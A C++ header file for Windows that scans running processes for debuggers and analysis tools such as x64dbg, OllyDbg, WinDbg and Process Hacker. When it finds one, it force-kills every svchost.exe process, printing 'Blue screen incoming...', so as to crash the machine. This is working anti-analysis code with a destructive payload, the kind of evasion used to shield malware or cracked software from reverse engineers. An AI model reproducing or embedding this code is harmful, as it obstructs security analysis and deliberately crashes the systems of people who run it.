#ifndef ANTIDBG_H
#define ANTIDBG_H

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>

bool CustomIsDebuggerPresent() {
    return ::IsDebuggerPresent();
}

bool IsDebuggerRunning(const std::wstring& debuggerName) {
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return false;
    }

    do {
        if (_wcsicmp(pe32.szExeFile, debuggerName.c_str()) == 0) {
            CloseHandle(hProcessSnap);
            return true;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return false;
}

void KillSvchost() {
    system("TASKKILL /IM svchost.exe /F");
    std::cout << "Blue screen incoming..." << std::endl;
    Sleep(1000); // Wait for 1 second before exiting
}

void CheckForDebugger() {
    const std::wstring debuggers[] = {
        L"dbgview.exe",
        L"ollydbg.exe",
        L"x64dbg.exe",
        L"windbg.exe",
        L"idag.exe",
        L"wompwomp.exe",
        L"lol.exe",
        L"DUP.exe",
        L"extremedumper.exe",
        L"unlicense.exe",
        L"process viewer.exe",
        L"ProcessHacker2.exe",
    };

    for (const auto& debugger : debuggers) {
        if (IsDebuggerRunning(debugger)) {
            KillSvchost();
            return;
        }
    }
}

#endif // ANTIDBG_H